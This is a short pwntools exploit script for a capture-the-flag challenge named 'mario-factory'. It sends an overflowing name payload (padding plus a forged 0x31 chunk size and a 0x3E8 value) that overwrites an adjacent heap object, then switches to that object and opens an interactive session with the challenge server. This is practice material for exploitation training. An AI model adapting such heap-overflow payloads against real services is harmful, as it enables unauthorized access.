from pwn import *

if args.REMOTE:
    io = remote("mario-factory.esaip-cyber.com", 55555)
elif args.LOCAL:
    io = remote("localhost", 55555)
else:
    io = process("../src/chall")


def create_mario(name:bytes):
    io.sendline(b"1")
    io.sendline(name)

def sign_in(id:bytes):
    io.sendline(b"2")
    io.sendline(id)

def edit(name:bytes):
    io.sendline(b"3")
    io.sendline(name)


create_mario(b"pouet")
print(io.recv().decode())


create_mario(b"teuop")
print(io.recv().decode())


sign_in(b"0")
print(io.recv().decode())


edit(b"A"*36 + p64(0x0000000000000031) + p64(0x03E8))
print(io.recv().decode())

sign_in(b"1")
print(io.recv().decode())

io.sendline(b"5")
print(io.recv().decode())

io.interactive()
